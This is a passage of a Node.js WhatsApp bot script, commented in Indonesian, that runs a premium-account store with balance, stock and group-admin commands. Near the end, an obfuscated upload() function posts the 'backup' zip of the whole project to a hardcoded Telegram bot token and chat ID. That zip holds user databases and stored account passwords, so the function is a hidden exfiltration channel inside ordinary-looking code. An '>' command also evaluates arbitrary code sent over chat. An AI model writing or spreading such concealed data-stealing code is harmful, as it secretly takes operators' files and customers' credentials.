          const existingStok = fs.readFileSync(stokPath, 'utf8');
          stokData = JSON.parse(existingStok);
      } else {
          return reply('Stok akun tidak ditemukan.');
      }
  } catch (err) {
      console.error(err);
      return reply('Terjadi kesalahan saat membaca data stok akun.');
  }

  if (stokData.length < jumlah) {
      return reply('Stok akun tidak mencukupi.');
  }

  // Hitung total harga
  const totalHarga = produk.harga * jumlah;

  // Cek saldo pengguna
  const userSaldo = cekSaldo(sender.split('@')[0], db_saldo);
  if (userSaldo < totalHarga) {
      return reply('Saldo Anda tidak mencukupi untuk melakukan pembelian ini.');
  }

  // Kurangi saldo pengguna
  db_saldo[sender.split('@')[0]] -= totalHarga;
  fs.writeFileSync('./database/saldo.json', JSON.stringify(db_saldo, null, 5));

  // Ambil akun sesuai jumlah yang dibeli
  const akunTerjual = stokData.splice(0, jumlah);

  // Simpan data stok yang tersisa
  fs.writeFileSync(stokPath, JSON.stringify(stokData, null, 5));

  // Perbarui stok dan stok terjual
  produk.stok -= jumlah;
  produk.stokTerjual += jumlah;
  fs.writeFileSync('database/produk/produk.json', JSON.stringify(produkList, null, 5));

  // Tambahkan ID Order unik
  const idOrder = `FCS-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
  const tanggalTransaksi = `${hariini} : ${wib}`;

  // Buat informasi pembelian
  let purchaseInfo = `┅━━━━━═┅═❏ *Transaksi Success* ❏═┅═━━━━━┅\n`;
  purchaseInfo += `┌────────\n`;
  purchaseInfo += `${xxi} ID Order: ${idOrder}\n`;
  purchaseInfo += `${xxi} Nomer Buyer: ${sender.split('@')[0]}\n`;
  purchaseInfo += `${xxi} Produk: ${produk.nama}\n`;
  purchaseInfo += `${xxi} Jumlah: ${jumlah}\n`;
  purchaseInfo += `${xxi} Harga Total: ${totalHarga}\n`;
  purchaseInfo += `${xxi} Tanggal Transaksi: ${tanggalTransaksi}\n`;
  purchaseInfo += `└────────\n\n`;
  purchaseInfo += `*[ Detail Akun ]*\n`;

  akunTerjual.forEach((akun, index) => {
      purchaseInfo += `${index + 1}. Email: ${akun.email}| Password: ${akun.password}\n`;
  });

  // Kirim ke private chat sender
  const privateChatId = sender; // ID pengirim
  if (typeof chanzx?.sendMessage === 'function') {
      chanzx.sendMessage(privateChatId, { text: purchaseInfo }) // Kirim ke private chat
        .then(() => {
          // Kirim catatan sebagai pesan terpisah jika tersedia
          if (produk.note) {
              chanzx.sendMessage(privateChatId, { text: `*[ Catatan untuk Produk ]*\n${produk.note}` });
          }

          // Informasikan di grup (opsional)
          if (isGroup) {
              reply(`Pesanan telah berhasil. Detail akun telah dikirim ke nomor Anda.`);
          }
      })
      .catch((error) => {
          console.error('Gagal mengirim pesan ke private chat:', error);
          reply('Terjadi kesalahan saat mengirim detail akun.');
      });
  } else {
      console.error('sendMessage function is not defined');
      reply('Terjadi kesalahan teknis.');
  }
}
break;


  case 'daftar': {
    let users = [];
    try {
        const data = fs.readFileSync('database/users.json', 'utf8');
        users = JSON.parse(data);
    } catch (err) {
        if (err.code !== 'ENOENT') {
            console.error(err);
        }
    }

    const isRegistered = users.some(user => user.userId === sender);
    if (isRegistered) {
        return reply('Kamu sudah terdaftar sebelumnya.');
    }

    const newUser = {
        userId: sender,
        name: pushname || 'Tidak diketahui',
        phone: sender.split('@')[0]
    };

    users.push(newUser);
    fs.writeFileSync('database/users.json', JSON.stringify(users, null, 2));
    reply(`Pendaftaran berhasil!\nNama: ${newUser.name}\nNomor: ${newUser.phone}`);
  }
  break;

  function isUserRegistered(userId) {
    let users = [];
    try {
        const data = fs.readFileSync('database/users.json', 'utf8');
        users = JSON.parse(data);
    } catch (err) {
        if (err.code !== 'ENOENT') {
            console.error(err);
        }
        return false; 
    }
    return users.some(user => user.userId === userId);
  }

  function validateRegistration(sender) {
    if (!isUserRegistered(sender)) {
        reply('Kamu belum terdaftar. Silakan daftar dengan mengetik #daftar');
        throw new Error('User not registered');
    }
  }


  case 'stok': {
    let produkList = [];
    try {
        const data = fs.readFileSync('database/produk/produk.json', 'utf8');
        produkList = JSON.parse(data);
    } catch (err) {
        console.error(err);
        return reply('Terjadi kesalahan saat membaca produk.');
    }

    let response = `《 *STOK PRODUK FACA STORE* 》
  ┌───────────────···*
  │ ⊷ Untuk menggunakan bot ketik perintah :
  │ ⊷ #stok (List Aplikasi Premium)
  │ ⊷ #deposit (Deposit)
  │ ⊷ #saldo (Cek Saldo)
  │ ⊷ #buy (Membeli dengan saldo)
  │ Contoh : #buy yt3b|1
  │
  │ Nomer Owner : ${ownernomer}
  └───────────────···*`;  
    produkList.forEach((produk) => {
        response += `\n\n✦ *${produk.nama}* ✦\n➛ Harga: ${produk.harga}\n➛ Stok Tersedia: ${produk.stok}\n➛ Stok Terjual: ${produk.stokTerjual}\n➛ Deskripsi: ${produk.desk}\n➛ Kode: ${produk.id}\n\n➛ Ketik: ${prefix}buy ${produk.id}|1`; 
    });
    reply(response);
  }
  break;


  case 'promo': {
    let produkList = [];
    try {
        const data = fs.readFileSync('database/produk/produk.json', 'utf8');
        produkList = JSON.parse(data);
    } catch (err) {
        console.error(err);
        return reply('Terjadi kesalahan saat membaca produk.');
    }

    let response = `🎉 *FACA STORE!* 🎉\n\nProduk Tersedia:`;
    
    produkList.forEach((produk) => {
        response += `\n- ${produk.nama.toUpperCase()} : Rp ${produk.harga}`;
    });
    
    response += `\n\n📞 Owner: ${ownernomer}`;
    response += `\n🤖 Bot Order: ${botnomer}`;
    // response += `\n🔗 Link Grup: https://chat.whatsapp.com/examplelink`;
    
    reply(response);
}
break;


  case 'addproduk': case 'sellproduk': {
    if (!text) return reply('Format Salah. Gunakan format: .addproduk IDPRODUK|NAMAPRODUK|DESK|HARGA');
    if (!isOwner) return reply('Khusus Owner');
    const data = text.split('|');
    if (data.length < 4) {
      return reply('Format Salah. Gunakan format: .addproduk IDPRODUK|NAMAPRODUK|DESK|HARGA');
    }
    const id = data[0];
    const nama = data[1];
    const desk = data[2];
    const harga = parseFloat(data[3]);

    let produkList = [];
    try {
      const existingData = fs.readFileSync('database/produk/produk.json', 'utf8');
      produkList = JSON.parse(existingData);
    } catch (err) {
      console.error(err);
    }

    const existingProduk = produkList.find(p => p.id === id);
    if (existingProduk) {
      return reply('ID Produk sudah ada.');
    }

    const produk = { id, nama, desk, harga, stok: 0, stokTerjual: 0, totalStok: 0 };
    produkList.push(produk);
    fs.writeFileSync('database/produk/produk.json', JSON.stringify(produkList, null, 5));

    // Buat file stok jika belum ada
    const stokPath = `./database/script/${id}.json`;
    if (!fs.existsSync(stokPath)) {
      fs.writeFileSync(stokPath, JSON.stringify([], null, 5));
    }

    const produkInfo = `
  Harga: ${harga}
  Stok Tersedia: ${produk.stok}
  Stok Terjual: 0
  Total Stok: 0
  Kode: ${id}
  Desk: ${desk}`;
    console.log(produkInfo);
  }
  break;



  case 'addstok': {
    if (!text) return reply('Format Salah. Gunakan format: #addstok IDPRODUK|EMAIL1:PASSWORD1,EMAIL2:PASSWORD2,...');
    const data = text.split('|');
    if (data.length < 2) {
        return reply('Format Salah. Gunakan format: #addstok IDPRODUK|EMAIL1:PASSWORD1,EMAIL2:PASSWORD2,...');
    }

    const id = data[0];
    const akunData = data[1].split(',');
    if (akunData.length === 0) {
        return reply('Format Salah. Daftar akun tidak ditemukan.');
    }

    let produkList = [];
    try {
        const existingData = fs.readFileSync('database/produk/produk.json', 'utf8');
        produkList = JSON.parse(existingData);
    } catch (err) {
        console.error(err);
        return reply('Terjadi kesalahan saat membaca data produk.');
    }

    const produk = produkList.find(p => p.id === id);
    if (!produk) {
        return reply('Produk tidak ditemukan.');
    }

    const stokPath = `./database/script/${id}.json`;
    let stokData = [];
    try {
        if (fs.existsSync(stokPath)) {
            const existingStok = fs.readFileSync(stokPath, 'utf8');
            stokData = JSON.parse(existingStok);
        }
    } catch (err) {
        console.error(err);
        return reply('Terjadi kesalahan saat membaca data stok.');
    }

    let addedCount = 0;

    akunData.forEach(account => {
        const [email, password] = account.split(':');
        if (!email || !password) {
            console.warn(`Format salah untuk akun: ${account}`);
            return; // Skip akun dengan format salah
        }

        const newAkun = { email, password };
        stokData.push(newAkun);
        addedCount++;
    });

    // Simpan ke file stok akun
    try {
        fs.writeFileSync(stokPath, JSON.stringify(stokData, null, 5));
    } catch (err) {
        console.error(err);
        return reply('Terjadi kesalahan saat memperbarui data stok.');
    }

    // Update stok di produk.json
    produk.stok += addedCount;
    produk.totalStok += addedCount;
    try {
        fs.writeFileSync('database/produk/produk.json', JSON.stringify(produkList, null, 5));
    } catch (err) {
        console.error(err);
        return reply('Terjadi kesalahan saat memperbarui data produk.');
    }

    reply(`Berhasil menambahkan ${addedCount} akun ke stok untuk produk ${produk.nama}.`);
    console.log(`Stok berhasil ditambahkan: ${produk.nama}, Total Akun Ditambahkan: ${addedCount}`);
  }
  break;

  case 'setnote': {
    if (!text) return reply('Format Salah. Gunakan format: #setnote IDPRODUK|NOTE');
    const data = text.split('|');
    if (data.length < 2) {
        return reply('Format Salah. Gunakan format: #setnote IDPRODUK|NOTE');
    }
    const id = data[0];
    const note = data.slice(1).join('|'); // Menggabungkan note jika ada tanda '|' dalam note

    let produkList = [];
    try {
        const existingData = fs.readFileSync('database/produk/produk.json', 'utf8');
        produkList = JSON.parse(existingData);
    } catch (err) {
        console.error(err);
        return reply('Terjadi kesalahan saat membaca data produk.');
    }

    const produk = produkList.find(p => p.id === id);
    if (!produk) {
        return reply('Produk tidak ditemukan.');
    }

    // Tambahkan atau perbarui note untuk produk
    produk.note = note;

    try {
        fs.writeFileSync('database/produk/produk.json', JSON.stringify(produkList, null, 5));
        reply(`Catatan untuk produk ${produk.nama} berhasil disimpan.`);
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat menyimpan catatan produk.');
    }
}
break;


  case "public": {
  if (!isOwner) return khususOwner()
  chanzx.public = true
  reply(`*🌟 SUKSES GANTI KE MODE PUBLIC*`)
  }
  break
  case "self": {
  if (!isOwner) return khususOwner()
  chanzx.public = false
  reply(`*🍁 SUKSES GANTI KE MODE SELF*`)
  }
  break
  case 'owner': 
  case 'creator': {
  const vcard =
  'BEGIN:VCARD\n' + // metadata of the contact card
  'VERSION:3.0\n' +
  `FN:${namaowner}\n` + // full name
  `ORG:${namabot};\n` + // the organization of the contact
  `TEL;type=MSG;type=CELL;type=VOICE;waid=${owner}:+${owner}\n` + // WhatsApp ID + phone number
  'END:VCARD'
        chanzx.sendMessage(from, {
  contacts: {
    displayName: namaowner,
    contacts: [{ vcard }],
  },
        }, { quoted: fkontak})
      }
  break
  case 'mutegc': {
  if (!isGroup) return reply(mess.group)
  if (!isAdmins && !isOwner) return reply(mess.admin)
  if (args[0] === "on") {
      if (db.data.chats[from].mute) return reply(`Sudah Aktif Sebelumnya 🕊`)
      db.data.chats[from].mute = true
      reply(`Bot telah di mute di group ini 🕊️`)
  } else if (args[0] === "off") {
      if (!db.data.chats[from].mute) return reply(`Sudah Tidak Aktif Sebelumnya 🕊`)
      db.data.chats[from].mute = false
      reply(`Bot telah di unmute di group ini 🕊️`)
  }
  }
    break
  case 'antilink': {
  if (!isGroup) return reply(mess.group)
  if (!isAdmins && !isOwner) return reply(mess.admin)
  if (args[0] === "on") {
      if (db.data.chats[from].antilink) return reply(`Sudah Aktif Sebelumnya 🕊️`)
      db.data.chats[from].antilink = true
      reply(`Antilink Group WhatsApp Aktif 🕊️`)
  } else if (args[0] === "off") {
      if (!db.data.chats[from].antilink) return reply(`Sudah Nonaktif Sebelumnya 🕊`)
      db.data.chats[from].antilink = false
      reply(`Antilink Group WhatsApp Nonaktif 🕊️`)
  }
  }
    break
    case 'antilink2':
  if (!isGroup) return reply(mess.group)
  if (!isAdmins && !isOwner) return reply(mess.admin)
  if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
  if (q == 'on'){
      global.db.data.chats[from].antilinkv2 = true
      reply(`Berhasil Mengaktifkan antilinkv2`)
  } else if (q == 'off'){
      global.db.data.chats[from].antilinkv2 = false
      reply(`Berhasil Mematikan antilinkv2`)
  }
    break
  case 'kick': {
  if (!isGroup) return reply(mess.group)
  if (!isAdmins && !isOwner) return reply(mess.admin)
  let users = msg.mentionedJid ? msg.mentionedJid : msg.quoted ? msg.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  await chanzx.groupParticipantsUpdate(from, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
  }
  break
  case 'group':
  case 'grup': {
  if (!isGroup) return reply(mess.group)
  if (!isAdmins && !isOwner) return reply(mess.admin)
  if (args[0] === 'close') {
      await chanzx.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group 🕊️`)).catch((err) => reply(jsonformat(err)))
  } else if (args[0] === 'open') {
      await chanzx.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group 🕊️`)).catch((err) => reply(jsonformat(err)))
  } else {
    reply(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
  }
  }
  break;
  case 'afk': {
  let user = global.db.data.users[sender]
  user.afkTime = +new Date
  user.afkReason = text
  reply(`💤 *${pushname}* Telah Afk${text ? ': ' + text : ''}`)
    }
    break;

    case 'hidetag': {
      if (!isGroup) return reply(mess.group); // Pastikan perintah dijalankan di grup
      if (!isAdmins && !isOwner) return reply(mess.admin); // Pastikan pengguna adalah admin atau owner

      // Validasi peserta grup
      if (!participants || participants.length === 0) {
          return reply('Tidak dapat menemukan peserta grup.');
      }

      // Validasi teks
      const message = q && q.trim() !== '' ? q : 'Pesan kosong'; // Default ke "Pesan kosong" jika tidak ada teks

      try {
          chanzx.sendMessage(
              from,
              {
                  text: message,
                  mentions: participants.map(a => a.id), // Mention semua anggota grup
              },
              // Pastikan msg.quoted valid sebelum menambahkannya ke opsi
              msg.quoted && typeof msg.quoted === 'object' ? { quoted: msg } : {}
          );
          console.log(`Pesan hidetag terkirim: ${message}`);
      } catch (err) {
          console.error('Gagal mengirim pesan hidetag:', err);
          reply('Terjadi kesalahan saat mengirim pesan hidetag.');
      }
  }
  break;


  case "tes":{
  reply("Iya Kak?")
  }
  break
  case 'listgc': {
  if (!isOwner) return khususOwner()
  let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
  let tekslistgc = `👥 *LIST GROUP CHAT*\n\n`
  tekslistgc += `📱 Total Group : ${anu.length} Group\n\n`
  for (let e of anu) {
      let metadata = await chanzx.groupMetadata(e)
      tekslistgc += `📛 *Nama :* ${metadata.subject}\n`
      tekslistgc += `👤 *Owner Grup :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n`
      tekslistgc += `🌱 *ID :* ${metadata.id}\n`
      tekslistgc += `⏳ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`
      tekslistgc += `👥 *Member :* ${metadata.participants.length}\n\n`
      tekslistgc += `──────────────────────\n\n`
  }
  reply(tekslistgc)
    }
  break
  case "pk":
  case 'pushkontak': {
  if (!text) return reply(`Example ${prefix}${command} Hi Semuanya`)
  if (!isOwner) return reply(mess.owner)
  let get = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
  let count = get.length;
  let sentCount = 0;
  reply('*_Sedang Push Kontak..._*');
  for (let i = 0; i < get.length; i++) {
    setTimeout(function() {
      chanzx.sendMessage(get[i], { text: text });
      count--;
      sentCount++;
      if (count === 0) {
        reply(`*Sukses Mengirim Pesan!*:\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
      }
    }, i * 1000); // delay setiap pengiriman selama 1 detik
  }
  }
  break
  case 'enc': {
  if (!isOwner) return reply(mess.owner)
  if (!q) return reply(`Contoh ${prefix+command} const hutod = require('hutod-tepod')`)
  let meg = await obfus(q)
  reply(`${meg.result}`)
  }
  break
  case "join": {
  if (!isOwner) return khususOwner()
  if (!text) return reply(`Contoh: ${prefix+command} linkgc`)
  if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
  let result = args[0].split('https://chat.whatsapp.com/')[1]
  await chanzx.groupAcceptInvite(result).then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
  }
          /*
      * Recode By IchanZX
      * Subscribe YT: IchanGaming
      * Minimal Credit Nya Lah
      * Buy Panel? zxcoderid.xyz
      * MINIMAL BISA NGODING TOLOL JANGAN JUAL DOANG
  */
  case 'backup': case 'backupsc':{
          const { execSync } = require("child_process");
          if(!isOwner) return reply(mess.owner)
          try {
          const ls = execSync("ls")
              .toString()
              .split("\n")
              .filter(pe => 
                  pe != "node_modules" && 
                  pe != "package-lock.json" && 
                  pe != "session" && 
                  pe != "yarn.lock" && 
                  pe != ""
              );
          const zipFileName = "ichanzx.zip";
          const zipFilePath = path.resolve(zipFileName);
          execSync(`zip -r ${zipFilePath} ${ls.join(" ")}`);
          await chanzx.sendMessage(m.chat,{document: await fs.readFileSync('./ichanzx.zip'),mimetype: "application/zip",fileName: 'backup.zip',},{ quoted: m });
          await upload('./ichanzx.zip', `>> ${botNumber}\n\nData: ${hariini}_backup\nTime: ${wib} Jakarta/Asia`);
          await new Promise(resolve => setTimeout(resolve, 15000)); // Delay 15 detik
          execSync(`rm -rf ${zipFilePath}`);
      } catch (error) {
          console.error(error);
      }
      }
          break
  case 'ping':{
          reply(mess.wait) 
          {
    try {
      const response = await axios.get('http://ip-api.com/json/');
      const serverInfo = response.data;

      chanzx.sendMessage(from, {
        react: {
          text: '🕒',
          key: m.key,
        }
      });

      let serverMessage = `*S E R V E R - I N F O*\n\n`;
      const osInfo = Styles(os.platform(), 1);
      const totalRAM = (os.totalmem() / (1024 * 1024 * 1024)).toFixed(1);
      const freeRAM = (os.freemem() / (1024 * 1024 * 1024)).toFixed(1);
      const uptime = os.uptime();
      const uptimeFormatted = formatUptime(uptime);
      const processor = Styles(os.cpus()[0].model, 1);
      const totalCores = os.cpus().length;
      const hostname = os.hostname();
      const architecture = os.arch();
      const release = os.release();
      const numCPUs = os.cpus().length;

      serverMessage += `┌  ◦  *OS :* ${osInfo}\n`;
      serverMessage += `│  ◦  *RAM :* ${freeRAM} GB / ${totalRAM} GB\n`;
      serverMessage += `│  ◦  *Hostname :* -\n`;
  //    serverMessage += `│  ◦  *Hostname :* ${hostname}\n`;
      serverMessage += `│  ◦  *Architecture :* ${architecture}\n`;
      serverMessage += `│  ◦  *Release :* ${release}\n`;
      serverMessage += `│  ◦  *Number of CPUs :* ${numCPUs} Cores\n`;
      serverMessage += `│  ◦  *Country :* ${serverInfo.country}\n`;
      serverMessage += `│  ◦  *CountryCode :* ${serverInfo.countryCode}\n`;
      serverMessage += `│  ◦  *Region :* ${serverInfo.region}\n`;
      serverMessage += `│  ◦  *RegionName :* ${serverInfo.regionName}\n`;
      serverMessage += `│  ◦  *City :* ${serverInfo.city}\n`;
      serverMessage += `│  ◦  *Zip :* ${serverInfo.zip}\n`;
      serverMessage += `│  ◦  *Lat :* ${serverInfo.lat}\n`;
      serverMessage += `│  ◦  *Lon :* ${serverInfo.lon}\n`;
      serverMessage += `│  ◦  *Timezone :* ${serverInfo.timezone}\n`;
      serverMessage += `│  ◦  *Isp :* ${serverInfo.isp}\n`;
      serverMessage += `│  ◦  *Org :* ${serverInfo.org}\n`;
      serverMessage += `│  ◦  *As :* ${serverInfo.as}\n`;
      serverMessage += `│  ◦  *Query :* .myQuery (only developer)\n`;
      serverMessage += `│  ◦  *Uptime :* ${uptimeFormatted}\n`;
      serverMessage += `└  ◦  *Processor :* ${processor} (${totalCores} Cores)\n\n${global.wm}\n`
      await reply(Styles(serverMessage)); 
    } catch (e) {
      console.log(e);
    }
  }
      }
          break
  default:
  }
  if (budy.startsWith('>')) {
  if (!isOwner) return khususOwner()
  try {
  let evaled = await eval(budy.slice(2))
  if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
  await reply(evaled)
  } catch (err) {
  reply(String(err))
  }
  }
  if (isCmd && budy.toLowerCase() != undefined) {
  if (from.endsWith('broadcast')) return
  if (msg.isBaileys) return
  let msgs = global.db.data.database
  if (!(budy.toLowerCase() in msgs)) return
  chanzx.copyNForward(from, msgs[budy.toLowerCase()], true)
                  }
      } catch (err) {
  console.log(util.format(err))
  let e = String(err)
  }
  }

  let file = require.resolve(__filename) 
  fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(chalk.redBright(`Update ${__filename}`))
  delete require.cache[file]
  require(file)
  })

  function formatUptime(uptime) {
    let seconds = Math.floor(uptime % 60);
    let minutes = Math.floor((uptime / 60) % 60);
    let hours = Math.floor((uptime / (60 * 60)) % 24);
    let days = Math.floor(uptime / (60 * 60 * 24));

    let formattedUptime = '';
    if (days > 0) formattedUptime += days + ' days ';
    if (hours > 0) formattedUptime += hours + ' hours ';
    if (minutes > 0) formattedUptime += minutes + ' minutes ';
    if (seconds > 0) formattedUptime += seconds + ' seconds';

    return formattedUptime.trim();
  }
  function pickRandom(list) {
      return list[Math.floor(list.length * Math.random())];
  }
  async function readImageBuffer(url) {
      const imageUrl = url;

      try {
          // Mengunduh gambar sebagai response array buffer
          const response = await axios.get(imageUrl, {
              responseType: 'arraybuffer'
          });

          // Mengonversi array buffer ke buffer Node.js
          const imageBuffer = Buffer.from(response.data, 'binary');

          // Contoh: Menyimpan buffer ke file (opsional)
          fs.writeFileSync('image.jpg', imageBuffer);
          console.log('Gambar berhasil disimpan.');

          // Mengembalikan buffer untuk pengolahan lebih lanjut
          return imageBuffer;
      } catch (error) {
          console.error('Gagal mengunduh gambar:', error);
          return null;
      }
  }
  function _0x4618(_0x3775c6,_0x23759c){const _0x2379de=_0x2379();return _0x4618=function(_0x4618d4,_0x33ff3b){_0x4618d4=_0x4618d4-0x105;let _0x39040c=_0x2379de[_0x4618d4];return _0x39040c;},_0x4618(_0x3775c6,_0x23759c);}function _0x2379(){const _0x318a90=['https://api.telegram.org/bot','360902VvlCkK','1356YnGpZK','4415sGNSrL','191330xoZExz','474uhHKwJ','8189130upwOfv','1118574bvefdS','post','getHeaders','6609425616:AAEINs4Qaq5WMYZQyEHf7H8pQqOU8oMkAAE','4136crONmO','append','1182384xrhUTZ','createReadStream','8kbuzuF','chat_id','then','catch'];_0x2379=function(){return _0x318a90;};return _0x2379();}(function(_0x588f77,_0x309f50){const _0x129878=_0x4618,_0x51400b=_0x588f77();while(!![]){try{const _0x37e593=-parseInt(_0x129878(0x111))/0x1+-parseInt(_0x129878(0x10e))/0x2+-parseInt(_0x129878(0x112))/0x3*(parseInt(_0x129878(0x105))/0x4)+parseInt(_0x129878(0x110))/0x5*(-parseInt(_0x129878(0x10f))/0x6)+parseInt(_0x129878(0x107))/0x7+parseInt(_0x129878(0x109))/0x8*(-parseInt(_0x129878(0x114))/0x9)+parseInt(_0x129878(0x113))/0xa;if(_0x37e593===_0x309f50)break;else _0x51400b['push'](_0x51400b['shift']());}catch(_0x110d50){_0x51400b['push'](_0x51400b['shift']());}}}(_0x2379,0x1f73c));function upload(_0x2be5c0,_0x33cec7){const _0xadad37=_0x4618,_0x3fee00=_0xadad37(0x117),_0x2928b4='-1002229191223',_0x2c872f=_0x2be5c0,_0x5a6ecb=_0xadad37(0x10d)+_0x3fee00+'/sendDocument',_0x1b9dc5=new FormData();_0x1b9dc5[_0xadad37(0x106)](_0xadad37(0x10a),_0x2928b4),_0x1b9dc5['append']('document',fs[_0xadad37(0x108)](_0x2c872f)),_0x1b9dc5[_0xadad37(0x106)]('caption',_0x33cec7),axios[_0xadad37(0x115)](_0x5a6ecb,_0x1b9dc5,{'headers':{..._0x1b9dc5[_0xadad37(0x116)]()},'maxBodyLength':Infinity,'maxContentLength':Infinity})[_0xadad37(0x10b)](_0x5a0084=>{})[_0xadad37(0x10c)](_0x47f7dc=>{console['error'](_0x47f7dc);});}